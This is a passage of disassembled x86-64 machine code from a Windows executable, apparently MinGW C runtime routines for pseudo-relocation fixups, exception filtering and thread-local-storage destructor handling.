   1400034d4:	48 8b 05 5d 8f 57 00 	mov    0x578f5d(%rip),%rax        # 0x14057c438
   1400034db:	31 d2                	xor    %edx,%edx
   1400034dd:	48 6b db 28          	imul   $0x28,%rbx,%rbx
   1400034e1:	48 01 d8             	add    %rbx,%rax
   1400034e4:	89 10                	mov    %edx,(%rax)
   1400034e6:	48 89 68 20          	mov    %rbp,0x20(%rax)
   1400034ea:	e8 50 08 00 00       	call   0x140003d3f
   1400034ef:	8b 55 0c             	mov    0xc(%rbp),%edx
   1400034f2:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   1400034f8:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
   1400034fc:	48 8b 05 35 8f 57 00 	mov    0x578f35(%rip),%rax        # 0x14057c438
   140003503:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003508:	48 89 4c 18 18       	mov    %rcx,0x18(%rax,%rbx,1)
   14000350d:	ff 15 c5 9c 57 00    	call   *0x579cc5(%rip)        # 0x14057d1d8
   140003513:	48 85 c0             	test   %rax,%rax
   140003516:	75 1b                	jne    0x140003533
   140003518:	48 8b 05 19 8f 57 00 	mov    0x578f19(%rip),%rax        # 0x14057c438
   14000351f:	8b 55 08             	mov    0x8(%rbp),%edx
   140003522:	48 8d 0d e3 4c 57 00 	lea    0x574ce3(%rip),%rcx        # 0x14057820c
   140003529:	4c 8b 44 18 18       	mov    0x18(%rax,%rbx,1),%r8
   14000352e:	e8 cd fe ff ff       	call   0x140003400
   140003533:	8b 44 24 44          	mov    0x44(%rsp),%eax
   140003537:	8d 50 fc             	lea    -0x4(%rax),%edx
   14000353a:	83 e2 fb             	and    $0xfffffffb,%edx
   14000353d:	74 54                	je     0x140003593
   14000353f:	8d 50 c0             	lea    -0x40(%rax),%edx
   140003542:	83 e2 bf             	and    $0xffffffbf,%edx
   140003545:	74 4c                	je     0x140003593
   140003547:	83 f8 02             	cmp    $0x2,%eax
   14000354a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000354f:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140003554:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   14000355a:	b8 04 00 00 00       	mov    $0x4,%eax
   14000355f:	44 0f 44 c0          	cmove  %eax,%r8d
   140003563:	48 03 1d ce 8e 57 00 	add    0x578ece(%rip),%rbx        # 0x14057c438
   14000356a:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   14000356e:	49 89 d9             	mov    %rbx,%r9
   140003571:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   140003575:	ff 15 55 9c 57 00    	call   *0x579c55(%rip)        # 0x14057d1d0
   14000357b:	85 c0                	test   %eax,%eax
   14000357d:	75 14                	jne    0x140003593
   14000357f:	ff 15 1b 9c 57 00    	call   *0x579c1b(%rip)        # 0x14057d1a0
   140003585:	48 8d 0d b1 4c 57 00 	lea    0x574cb1(%rip),%rcx        # 0x14057823d
   14000358c:	89 c2                	mov    %eax,%edx
   14000358e:	e8 6d fe ff ff       	call   0x140003400
   140003593:	ff 05 9b 8e 57 00    	incl   0x578e9b(%rip)        # 0x14057c434
   140003599:	89 f9                	mov    %edi,%ecx
   14000359b:	4c 89 e7             	mov    %r12,%rdi
   14000359e:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400035a0:	48 83 c4 50          	add    $0x50,%rsp
   1400035a4:	5b                   	pop    %rbx
   1400035a5:	5e                   	pop    %rsi
   1400035a6:	5f                   	pop    %rdi
   1400035a7:	5d                   	pop    %rbp
   1400035a8:	41 5c                	pop    %r12
   1400035aa:	c3                   	ret
   1400035ab:	55                   	push   %rbp
   1400035ac:	41 55                	push   %r13
   1400035ae:	41 54                	push   %r12
   1400035b0:	57                   	push   %rdi
   1400035b1:	56                   	push   %rsi
   1400035b2:	53                   	push   %rbx
   1400035b3:	48 83 ec 48          	sub    $0x48,%rsp
   1400035b7:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   1400035bc:	83 3d 6d 8e 57 00 00 	cmpl   $0x0,0x578e6d(%rip)        # 0x14057c430
   1400035c3:	0f 85 40 02 00 00    	jne    0x140003809
   1400035c9:	c7 05 5d 8e 57 00 01 	movl   $0x1,0x578e5d(%rip)        # 0x14057c430
   1400035d0:	00 00 00 
   1400035d3:	e8 ec 06 00 00       	call   0x140003cc4
   1400035d8:	48 98                	cltq
   1400035da:	48 6b c0 28          	imul   $0x28,%rax,%rax
   1400035de:	48 83 c0 0f          	add    $0xf,%rax
   1400035e2:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400035e6:	e8 25 08 00 00       	call   0x140003e10
   1400035eb:	31 d2                	xor    %edx,%edx
   1400035ed:	48 8b 35 8c 4d 57 00 	mov    0x574d8c(%rip),%rsi        # 0x140578380
   1400035f4:	89 15 3a 8e 57 00    	mov    %edx,0x578e3a(%rip)        # 0x14057c434
   1400035fa:	48 8b 15 8f 4d 57 00 	mov    0x574d8f(%rip),%rdx        # 0x140578390
   140003601:	48 89 f1             	mov    %rsi,%rcx
   140003604:	48 29 d1             	sub    %rdx,%rcx
   140003607:	48 29 c4             	sub    %rax,%rsp
   14000360a:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000360f:	48 89 05 22 8e 57 00 	mov    %rax,0x578e22(%rip)        # 0x14057c438
   140003616:	48 83 f9 07          	cmp    $0x7,%rcx
   14000361a:	0f 8e af 01 00 00    	jle    0x1400037cf
   140003620:	8b 02                	mov    (%rdx),%eax
   140003622:	48 89 d3             	mov    %rdx,%rbx
   140003625:	48 83 f9 0b          	cmp    $0xb,%rcx
   140003629:	7e 10                	jle    0x14000363b
   14000362b:	0b 42 04             	or     0x4(%rdx),%eax
   14000362e:	0b 42 08             	or     0x8(%rdx),%eax
   140003631:	48 83 c3 0c          	add    $0xc,%rbx
   140003635:	85 c0                	test   %eax,%eax
   140003637:	48 0f 45 da          	cmovne %rdx,%rbx
   14000363b:	83 3b 00             	cmpl   $0x0,(%rbx)
   14000363e:	74 0d                	je     0x14000364d
   140003640:	48 8b 3d 69 4d 57 00 	mov    0x574d69(%rip),%rdi        # 0x1405783b0
   140003647:	4c 8d 65 f8          	lea    -0x8(%rbp),%r12
   14000364b:	eb 08                	jmp    0x140003655
   14000364d:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140003651:	74 2c                	je     0x14000367f
   140003653:	eb eb                	jmp    0x140003640
   140003655:	48 39 f3             	cmp    %rsi,%rbx
   140003658:	0f 83 71 01 00 00    	jae    0x1400037cf
   14000365e:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140003661:	8b 03                	mov    (%rbx),%eax
   140003663:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140003669:	4c 89 e2             	mov    %r12,%rdx
   14000366c:	48 83 c3 08          	add    $0x8,%rbx
   140003670:	48 01 f9             	add    %rdi,%rcx
   140003673:	03 01                	add    (%rcx),%eax
   140003675:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140003678:	e8 e7 fd ff ff       	call   0x140003464
   14000367d:	eb d6                	jmp    0x140003655
   14000367f:	8b 53 08             	mov    0x8(%rbx),%edx
   140003682:	48 83 c3 0c          	add    $0xc,%rbx
   140003686:	83 fa 01             	cmp    $0x1,%edx
   140003689:	75 17                	jne    0x1400036a2
   14000368b:	48 8b 3d 1e 4d 57 00 	mov    0x574d1e(%rip),%rdi        # 0x1405783b0
   140003692:	49 83 cd ff          	or     $0xffffffffffffffff,%r13
   140003696:	49 bc 00 00 00 00 ff 	movabs $0xffffffff00000000,%r12
   14000369d:	ff ff ff 
   1400036a0:	eb 57                	jmp    0x1400036f9
   1400036a2:	48 8d 0d bb 4b 57 00 	lea    0x574bbb(%rip),%rcx        # 0x140578264
   1400036a9:	e9 88 00 00 00       	jmp    0x140003736
   1400036ae:	41 0f b6 02          	movzbl (%r10),%eax
   1400036b2:	84 c0                	test   %al,%al
   1400036b4:	79 06                	jns    0x1400036bc
   1400036b6:	48 0d 00 ff ff ff    	or     $0xffffffffffffff00,%rax
   1400036bc:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400036c0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400036c4:	4c 29 c0             	sub    %r8,%rax
   1400036c7:	4c 01 c8             	add    %r9,%rax
   1400036ca:	80 e1 c0             	and    $0xc0,%cl
   1400036cd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400036d1:	0f 84 9c 00 00 00    	je     0x140003773
   1400036d7:	83 fa 20             	cmp    $0x20,%edx
   1400036da:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400036e0:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   1400036e4:	0f 85 bf 00 00 00    	jne    0x1400037a9
   1400036ea:	48 89 c2             	mov    %rax,%rdx
   1400036ed:	4c 89 d1             	mov    %r10,%rcx
   1400036f0:	48 83 c3 0c          	add    $0xc,%rbx
   1400036f4:	e8 6b fd ff ff       	call   0x140003464
   1400036f9:	48 39 f3             	cmp    %rsi,%rbx
   1400036fc:	0f 83 cd 00 00 00    	jae    0x1400037cf
   140003702:	44 8b 03             	mov    (%rbx),%r8d
   140003705:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140003708:	44 8b 53 04          	mov    0x4(%rbx),%r10d
   14000370c:	49 01 f8             	add    %rdi,%r8
   14000370f:	0f b6 d1             	movzbl %cl,%edx
   140003712:	4d 8b 08             	mov    (%r8),%r9
   140003715:	49 01 fa             	add    %rdi,%r10
   140003718:	83 fa 20             	cmp    $0x20,%edx
   14000371b:	74 43                	je     0x140003760
   14000371d:	77 1c                	ja     0x14000373b
   14000371f:	83 fa 08             	cmp    $0x8,%edx
   140003722:	74 8a                	je     0x1400036ae
   140003724:	83 fa 10             	cmp    $0x10,%edx
   140003727:	74 1f                	je     0x140003748
   140003729:	31 c0                	xor    %eax,%eax
   14000372b:	48 8d 0d 64 4b 57 00 	lea    0x574b64(%rip),%rcx        # 0x140578296
   140003732:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003736:	e8 c5 fc ff ff       	call   0x140003400
   14000373b:	83 fa 40             	cmp    $0x40,%edx
   14000373e:	75 e9                	jne    0x140003729
   140003740:	49 8b 02             	mov    (%r10),%rax
   140003743:	e9 74 ff ff ff       	jmp    0x1400036bc
   140003748:	41 0f b7 02          	movzwl (%r10),%eax
   14000374c:	66 85 c0             	test   %ax,%ax
   14000374f:	0f 89 67 ff ff ff    	jns    0x1400036bc
   140003755:	48 0d 00 00 ff ff    	or     $0xffffffffffff0000,%rax
   14000375b:	e9 5c ff ff ff       	jmp    0x1400036bc
   140003760:	41 8b 02             	mov    (%r10),%eax
   140003763:	85 c0                	test   %eax,%eax
   140003765:	0f 89 51 ff ff ff    	jns    0x1400036bc
   14000376b:	4c 09 e0             	or     %r12,%rax
   14000376e:	e9 49 ff ff ff       	jmp    0x1400036bc
   140003773:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   140003776:	4d 89 eb             	mov    %r13,%r11
   140003779:	49 d3 e3             	shl    %cl,%r11
   14000377c:	4c 39 d8             	cmp    %r11,%rax
   14000377f:	7c 14                	jl     0x140003795
   140003781:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003787:	89 d1                	mov    %edx,%ecx
   140003789:	49 d3 e0             	shl    %cl,%r8
   14000378c:	4c 39 c0             	cmp    %r8,%rax
   14000378f:	0f 8c 42 ff ff ff    	jl     0x1400036d7
   140003795:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000379a:	4d 89 d0             	mov    %r10,%r8
   14000379d:	48 8d 0d 1c 4b 57 00 	lea    0x574b1c(%rip),%rcx        # 0x1405782c0
   1400037a4:	e8 57 fc ff ff       	call   0x140003400
   1400037a9:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400037af:	0f 87 35 ff ff ff    	ja     0x1400036ea
   1400037b5:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400037bb:	83 fa 08             	cmp    $0x8,%edx
   1400037be:	0f 84 26 ff ff ff    	je     0x1400036ea
   1400037c4:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400037ca:	e9 1b ff ff ff       	jmp    0x1400036ea
   1400037cf:	48 8b 3d fa 99 57 00 	mov    0x5799fa(%rip),%rdi        # 0x14057d1d0
   1400037d6:	31 db                	xor    %ebx,%ebx
   1400037d8:	48 8d 75 f8          	lea    -0x8(%rbp),%rsi
   1400037dc:	39 1d 52 8c 57 00    	cmp    %ebx,0x578c52(%rip)        # 0x14057c434
   1400037e2:	7e 25                	jle    0x140003809
   1400037e4:	48 6b c3 28          	imul   $0x28,%rbx,%rax
   1400037e8:	48 03 05 49 8c 57 00 	add    0x578c49(%rip),%rax        # 0x14057c438
   1400037ef:	44 8b 00             	mov    (%rax),%r8d
   1400037f2:	45 85 c0             	test   %r8d,%r8d
   1400037f5:	74 0d                	je     0x140003804
   1400037f7:	48 8b 50 10          	mov    0x10(%rax),%rdx
   1400037fb:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400037ff:	49 89 f1             	mov    %rsi,%r9
   140003802:	ff d7                	call   *%rdi
   140003804:	48 ff c3             	inc    %rbx
   140003807:	eb d3                	jmp    0x1400037dc
   140003809:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   14000380d:	5b                   	pop    %rbx
   14000380e:	5e                   	pop    %rsi
   14000380f:	5f                   	pop    %rdi
   140003810:	41 5c                	pop    %r12
   140003812:	41 5d                	pop    %r13
   140003814:	5d                   	pop    %rbp
   140003815:	c3                   	ret
   140003816:	90                   	nop
   140003817:	90                   	nop
   140003818:	90                   	nop
   140003819:	90                   	nop
   14000381a:	90                   	nop
   14000381b:	90                   	nop
   14000381c:	90                   	nop
   14000381d:	90                   	nop
   14000381e:	90                   	nop
   14000381f:	90                   	nop
   140003820:	48 83 ec 58          	sub    $0x58,%rsp
   140003824:	48 8b 05 15 8c 57 00 	mov    0x578c15(%rip),%rax        # 0x14057c440
   14000382b:	48 85 c0             	test   %rax,%rax
   14000382e:	74 2c                	je     0x14000385c
   140003830:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   140003837:	00 00 
   140003839:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000383d:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140003842:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   140003847:	f2 0f 11 54 24 38    	movsd  %xmm2,0x38(%rsp)
   14000384d:	f2 0f 11 5c 24 40    	movsd  %xmm3,0x40(%rsp)
   140003853:	f2 0f 11 44 24 48    	movsd  %xmm0,0x48(%rsp)
   140003859:	ff d0                	call   *%rax
   14000385b:	90                   	nop
   14000385c:	48 83 c4 58          	add    $0x58,%rsp
   140003860:	c3                   	ret
   140003861:	48 89 0d d8 8b 57 00 	mov    %rcx,0x578bd8(%rip)        # 0x14057c440
   140003868:	e9 63 06 00 00       	jmp    0x140003ed0
   14000386d:	90                   	nop
   14000386e:	90                   	nop
   14000386f:	90                   	nop
   140003870:	56                   	push   %rsi
   140003871:	53                   	push   %rbx
   140003872:	48 83 ec 28          	sub    $0x28,%rsp
   140003876:	48 8b 11             	mov    (%rcx),%rdx
   140003879:	8b 02                	mov    (%rdx),%eax
   14000387b:	48 89 cb             	mov    %rcx,%rbx
   14000387e:	89 c1                	mov    %eax,%ecx
   140003880:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
   140003886:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
   14000388c:	75 06                	jne    0x140003894
   14000388e:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
   140003892:	74 4d                	je     0x1400038e1
   140003894:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
   140003899:	0f 87 f8 00 00 00    	ja     0x140003997
   14000389f:	3d 8b 00 00 c0       	cmp    $0xc000008b,%eax
   1400038a4:	77 16                	ja     0x1400038bc
   1400038a6:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   1400038ab:	74 48                	je     0x1400038f5
   1400038ad:	77 2b                	ja     0x1400038da
   1400038af:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   1400038b4:	0f 85 dd 00 00 00    	jne    0x140003997
   1400038ba:	eb 25                	jmp    0x1400038e1
   1400038bc:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
   1400038c1:	83 f8 09             	cmp    $0x9,%eax
   1400038c4:	77 1b                	ja     0x1400038e1
   1400038c6:	48 8d 15 53 4a 57 00 	lea    0x574a53(%rip),%rdx        # 0x140578320
   1400038cd:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   1400038d1:	48 01 d0             	add    %rdx,%rax
   1400038d4:	ff e0                	jmp    *%rax
   1400038d6:	31 f6                	xor    %esi,%esi
   1400038d8:	eb 79                	jmp    0x140003953
   1400038da:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   1400038df:	75 08                	jne    0x1400038e9
   1400038e1:	83 c8 ff             	or     $0xffffffff,%eax
   1400038e4:	e9 c8 00 00 00       	jmp    0x1400039b1
   1400038e9:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   1400038ee:	74 2f                	je     0x14000391f
   1400038f0:	e9 a2 00 00 00       	jmp    0x140003997
   1400038f5:	31 d2                	xor    %edx,%edx
   1400038f7:	b9 0b 00 00 00       	mov    $0xb,%ecx
   1400038fc:	e8 2f 06 00 00       	call   0x140003f30
   140003901:	48 83 f8 01          	cmp    $0x1,%rax
   140003905:	75 0c                	jne    0x140003913
   140003907:	ba 01 00 00 00       	mov    $0x1,%edx
   14000390c:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140003911:	eb 28                	jmp    0x14000393b
   140003913:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140003918:	48 85 c0             	test   %rax,%rax
   14000391b:	74 7a                	je     0x140003997
   14000391d:	eb 71                	jmp    0x140003990
   14000391f:	31 d2                	xor    %edx,%edx
   140003921:	b9 04 00 00 00       	mov    $0x4,%ecx
   140003926:	e8 05 06 00 00       	call   0x140003f30
   14000392b:	48 83 f8 01          	cmp    $0x1,%rax
   14000392f:	75 11                	jne    0x140003942
   140003931:	ba 01 00 00 00       	mov    $0x1,%edx
   140003936:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000393b:	e8 f0 05 00 00       	call   0x140003f30
   140003940:	eb 9f                	jmp    0x1400038e1
   140003942:	b9 04 00 00 00       	mov    $0x4,%ecx
   140003947:	48 85 c0             	test   %rax,%rax
   14000394a:	74 4b                	je     0x140003997
   14000394c:	eb 42                	jmp    0x140003990
   14000394e:	be 01 00 00 00       	mov    $0x1,%esi
   140003953:	31 d2                	xor    %edx,%edx
   140003955:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000395a:	e8 d1 05 00 00       	call   0x140003f30
   14000395f:	48 83 f8 01          	cmp    $0x1,%rax
   140003963:	75 21                	jne    0x140003986
   140003965:	ba 01 00 00 00       	mov    $0x1,%edx
   14000396a:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000396f:	e8 bc 05 00 00       	call   0x140003f30
   140003974:	85 f6                	test   %esi,%esi
   140003976:	0f 84 65 ff ff ff    	je     0x1400038e1
   14000397c:	e8 6f fa ff ff       	call   0x1400033f0
   140003981:	e9 5b ff ff ff       	jmp    0x1400038e1
   140003986:	48 85 c0             	test   %rax,%rax
   140003989:	74 0c                	je     0x140003997
   14000398b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003990:	ff d0                	call   *%rax
   140003992:	e9 4a ff ff ff       	jmp    0x1400038e1
   140003997:	48 8b 05 c2 8a 57 00 	mov    0x578ac2(%rip),%rax        # 0x14057c460
   14000399e:	48 85 c0             	test   %rax,%rax
   1400039a1:	74 0c                	je     0x1400039af
   1400039a3:	48 89 d9             	mov    %rbx,%rcx
   1400039a6:	48 83 c4 28          	add    $0x28,%rsp
   1400039aa:	5b                   	pop    %rbx
   1400039ab:	5e                   	pop    %rsi
   1400039ac:	48 ff e0             	rex.W jmp *%rax
   1400039af:	31 c0                	xor    %eax,%eax
   1400039b1:	48 83 c4 28          	add    $0x28,%rsp
   1400039b5:	5b                   	pop    %rbx
   1400039b6:	5e                   	pop    %rsi
   1400039b7:	c3                   	ret
   1400039b8:	90                   	nop
   1400039b9:	90                   	nop
   1400039ba:	90                   	nop
   1400039bb:	90                   	nop
   1400039bc:	90                   	nop
   1400039bd:	90                   	nop
   1400039be:	90                   	nop
   1400039bf:	90                   	nop
   1400039c0:	57                   	push   %rdi
   1400039c1:	56                   	push   %rsi
   1400039c2:	53                   	push   %rbx
   1400039c3:	48 83 ec 20          	sub    $0x20,%rsp
   1400039c7:	48 8d 3d d2 8a 57 00 	lea    0x578ad2(%rip),%rdi        # 0x14057c4a0
   1400039ce:	48 89 f9             	mov    %rdi,%rcx
   1400039d1:	ff 15 c1 97 57 00    	call   *0x5797c1(%rip)        # 0x14057d198
   1400039d7:	48 8b 1d a2 8a 57 00 	mov    0x578aa2(%rip),%rbx        # 0x14057c480
   1400039de:	48 85 db             	test   %rbx,%rbx
   1400039e1:	74 29                	je     0x140003a0c
   1400039e3:	8b 0b                	mov    (%rbx),%ecx
   1400039e5:	ff 15 dd 97 57 00    	call   *0x5797dd(%rip)        # 0x14057d1c8
   1400039eb:	48 89 c6             	mov    %rax,%rsi
   1400039ee:	ff 15 ac 97 57 00    	call   *0x5797ac(%rip)        # 0x14057d1a0
   1400039f4:	48 85 f6             	test   %rsi,%rsi
   1400039f7:	74 0d                	je     0x140003a06
   1400039f9:	85 c0                	test   %eax,%eax
   1400039fb:	75 09                	jne    0x140003a06
   1400039fd:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140003a01:	48 89 f1             	mov    %rsi,%rcx
   140003a04:	ff d0                	call   *%rax
   140003a06:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140003a0a:	eb d2                	jmp    0x1400039de
   140003a0c:	48 89 f9             	mov    %rdi,%rcx
   140003a0f:	48 83 c4 20          	add    $0x20,%rsp
   140003a13:	5b                   	pop    %rbx
   140003a14:	5e                   	pop    %rsi
   140003a15:	5f                   	pop    %rdi
   140003a16:	48 ff 25 93 97 57 00 	rex.W jmp *0x579793(%rip)        # 0x14057d1b0
   140003a1d:	57                   	push   %rdi
   140003a1e:	56                   	push   %rsi
   140003a1f:	53                   	push   %rbx
   140003a20:	48 83 ec 20          	sub    $0x20,%rsp
   140003a24:	8b 05 5e 8a 57 00    	mov    0x578a5e(%rip),%eax        # 0x14057c488
   140003a2a:	89 cf                	mov    %ecx,%edi
   140003a2c:	48 89 d6             	mov    %rdx,%rsi
   140003a2f:	85 c0                	test   %eax,%eax
   140003a31:	74 4b                	je     0x140003a7e
   140003a33:	ba 18 00 00 00       	mov    $0x18,%edx
   140003a38:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003a3d:	e8 be 04 00 00       	call   0x140003f00
   140003a42:	48 89 c3             	mov    %rax,%rbx
   140003a45:	83 c8 ff             	or     $0xffffffff,%eax
   140003a48:	48 85 db             	test   %rbx,%rbx
   140003a4b:	74 33                	je     0x140003a80
   140003a4d:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   140003a51:	48 8d 35 48 8a 57 00 	lea    0x578a48(%rip),%rsi        # 0x14057c4a0
   140003a58:	48 89 f1             	mov    %rsi,%rcx
   140003a5b:	89 3b                	mov    %edi,(%rbx)
   140003a5d:	ff 15 35 97 57 00    	call   *0x579735(%rip)        # 0x14057d198
   140003a63:	48 8b 05 16 8a 57 00 	mov    0x578a16(%rip),%rax        # 0x14057c480
   140003a6a:	48 89 f1             	mov    %rsi,%rcx
   140003a6d:	48 89 1d 0c 8a 57 00 	mov    %rbx,0x578a0c(%rip)        # 0x14057c480
   140003a74:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140003a78:	ff 15 32 97 57 00    	call   *0x579732(%rip)        # 0x14057d1b0
   140003a7e:	31 c0                	xor    %eax,%eax
   140003a80:	48 83 c4 20          	add    $0x20,%rsp
   140003a84:	5b                   	pop    %rbx
   140003a85:	5e                   	pop    %rsi
   140003a86:	5f                   	pop    %rdi
   140003a87:	c3                   	ret
   140003a88:	56                   	push   %rsi
   140003a89:	53                   	push   %rbx
   140003a8a:	48 83 ec 28          	sub    $0x28,%rsp
   140003a8e:	8b 05 f4 89 57 00    	mov    0x5789f4(%rip),%eax        # 0x14057c488
   140003a94:	89 cb                	mov    %ecx,%ebx
   140003a96:	85 c0                	test   %eax,%eax
   140003a98:	74 5a                	je     0x140003af4
   140003a9a:	48 8d 35 ff 89 57 00 	lea    0x5789ff(%rip),%rsi        # 0x14057c4a0
   140003aa1:	48 89 f1             	mov    %rsi,%rcx
   140003aa4:	ff 15 ee 96 57 00    	call   *0x5796ee(%rip)        # 0x14057d198
   140003aaa:	48 8b 0d cf 89 57 00 	mov    0x5789cf(%rip),%rcx        # 0x14057c480
   140003ab1:	31 c0                	xor    %eax,%eax
   140003ab3:	48 85 c9             	test   %rcx,%rcx
   140003ab6:	74 33                	je     0x140003aeb
   140003ab8:	8b 11                	mov    (%rcx),%edx
   140003aba:	39 da                	cmp    %ebx,%edx
   140003abc:	75 21                	jne    0x140003adf
   140003abe:	48 85 c0             	test   %rax,%rax
   140003ac1:	75 0d                	jne    0x140003ad0
   140003ac3:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140003ac7:	48 89 05 b2 89 57 00 	mov    %rax,0x5789b2(%rip)        # 0x14057c480
   140003ace:	eb 08                	jmp    0x140003ad8
   140003ad0:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   140003ad4:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140003ad8:	e8 43 04 00 00       	call   0x140003f20
   140003add:	eb 0c                	jmp    0x140003aeb
   140003adf:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   140003ae3:	48 89 c8             	mov    %rcx,%rax
   140003ae6:	48 89 d1             	mov    %rdx,%rcx
   140003ae9:	eb c8                	jmp    0x140003ab3
   140003aeb:	48 89 f1             	mov    %rsi,%rcx
   140003aee:	ff 15 bc 96 57 00    	call   *0x5796bc(%rip)        # 0x14057d1b0
   140003af4:	31 c0                	xor    %eax,%eax
   140003af6:	48 83 c4 28          	add    $0x28,%rsp
   140003afa:	5b                   	pop    %rbx
   140003afb:	5e                   	pop    %rsi
   140003afc:	c3                   	ret
   140003afd:	53                   	push   %rbx
   140003afe:	48 83 ec 20          	sub    $0x20,%rsp
   140003b02:	83 fa 02             	cmp    $0x2,%edx
   140003b05:	0f 84 8c 00 00 00    	je     0x140003b97
   140003b0b:	77 06                	ja     0x140003b13
   140003b0d:	85 d2                	test   %edx,%edx
   140003b0f:	75 10                	jne    0x140003b21
   140003b11:	eb 31                	jmp    0x140003b44
   140003b13:	83 fa 03             	cmp    $0x3,%edx
   140003b16:	0f 84 82 00 00 00    	je     0x140003b9e
   140003b1c:	e9 8c 00 00 00       	jmp    0x140003bad
   140003b21:	8b 05 61 89 57 00    	mov    0x578961(%rip),%eax        # 0x14057c488
   140003b27:	85 c0                	test   %eax,%eax
   140003b29:	75 0d                	jne    0x140003b38
   140003b2b:	48 8d 0d 6e 89 57 00 	lea    0x57896e(%rip),%rcx        # 0x14057c4a0
   140003b32:	ff 15 70 96 57 00    	call   *0x579670(%rip)        # 0x14057d1a8
   140003b38:	c7 05 46 89 57 00 01 	movl   $0x1,0x578946(%rip)        # 0x14057c488
   140003b3f:	00 00 00 
   140003b42:	eb 69                	jmp    0x140003bad
   140003b44:	8b 05 3e 89 57 00    	mov    0x57893e(%rip),%eax        # 0x14057c488
   140003b4a:	85 c0                	test   %eax,%eax
   140003b4c:	74 05                	je     0x140003b53
   140003b4e:	e8 6d fe ff ff       	call   0x1400039c0
   140003b53:	8b 05 2f 89 57 00    	mov    0x57892f(%rip),%eax        # 0x14057c488
   140003b59:	48 8b 0d 20 89 57 00 	mov    0x578920(%rip),%rcx        # 0x14057c480
   140003b60:	ff c8                	dec    %eax
   140003b62:	75 49                	jne    0x140003bad
   140003b64:	48 85 c9             	test   %rcx,%rcx
   140003b67:	74 0e                	je     0x140003b77
   140003b69:	48 8b 59 10          	mov    0x10(%rcx),%rbx
   140003b6d:	e8 ae 03 00 00       	call   0x140003f20
   140003b72:	48 89 d9             	mov    %rbx,%rcx
   140003b75:	eb ed                	jmp    0x140003b64
   140003b77:	31 c0                	xor    %eax,%eax
   140003b79:	31 d2                	xor    %edx,%edx
   140003b7b:	48 8d 0d 1e 89 57 00 	lea    0x57891e(%rip),%rcx        # 0x14057c4a0
   140003b82:	48 89 05 f7 88 57 00 	mov    %rax,0x5788f7(%rip)        # 0x14057c480
   140003b89:	89 15 f9 88 57 00    	mov    %edx,0x5788f9(%rip)        # 0x14057c488
   140003b8f:	ff 15 fb 95 57 00    	call   *0x5795fb(%rip)        # 0x14057d190
   140003b95:	eb 16                	jmp    0x140003bad
   140003b97:	e8 54 f8 ff ff       	call   0x1400033f0
   140003b9c:	eb 0f                	jmp    0x140003bad
   140003b9e:	8b 05 e4 88 57 00    	mov    0x5788e4(%rip),%eax        # 0x14057c488
   140003ba4:	85 c0                	test   %eax,%eax
   140003ba6:	74 05                	je     0x140003bad
   140003ba8:	e8 13 fe ff ff       	call   0x1400039c0
   140003bad:	b8 01 00 00 00       	mov    $0x1,%eax
   140003bb2:	48 83 c4 20          	add    $0x20,%rsp
   140003bb6:	5b                   	pop    %rbx
   140003bb7:	c3                   	ret
   140003bb8:	90                   	nop
   140003bb9:	90                   	nop
   140003bba:	90                   	nop
   140003bbb:	90                   	nop
   140003bbc:	90                   	nop
   140003bbd:	90                   	nop
   140003bbe:	90                   	nop
   140003bbf:	90                   	nop
   140003bc0:	31 c0                	xor    %eax,%eax
